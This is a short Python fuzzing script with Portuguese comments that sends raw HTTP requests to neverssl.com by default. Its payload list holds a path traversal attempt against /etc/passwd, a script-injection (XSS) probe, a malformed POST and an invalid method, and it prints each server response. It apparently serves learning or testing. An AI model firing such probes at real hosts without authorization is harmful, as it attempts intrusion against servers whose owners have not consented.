import socket

target_host = "neverssl.com"   # pode ser seu servidor local também
target_port = 80

# Lista de payloads para fuzzing
payloads = [
    b"GET / HTTP/1.1\r\nHost: neverssl.com\r\n\r\n",       # requisição normal
    b"GET /../../etc/passwd HTTP/1.1\r\nHost: test\r\n\r\n", # tentativa de path traversal
    b"GET /<script>alert(1)</script> HTTP/1.1\r\nHost: test\r\n\r\n", # XSS
    b"POST / HTTP/1.1\r\nHost: test\r\nContent-Length: 100\r\n\r\nAAAA", # POST estranho
    b"INVALID / HTTP/1.1\r\nHost: test\r\n\r\n",           # método HTTP inválido
]

for i, payload in enumerate(payloads, 1):
    print(f"\n[+] Enviando payload {i}: {payload.split()[0].decode(errors='ignore')}")
    
    # Criar socket
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.settimeout(3)
    client.connect((target_host, target_port))
    
    # Enviar payload
    client.sendall(payload)
    
    try:
        response = client.recv(4096)
        print("Resposta recebida:\n", response.decode(errors="replace")[:200], "...")  # só mostra início
    except socket.timeout:
        print("Sem resposta (timeout)")
    
    client.close()
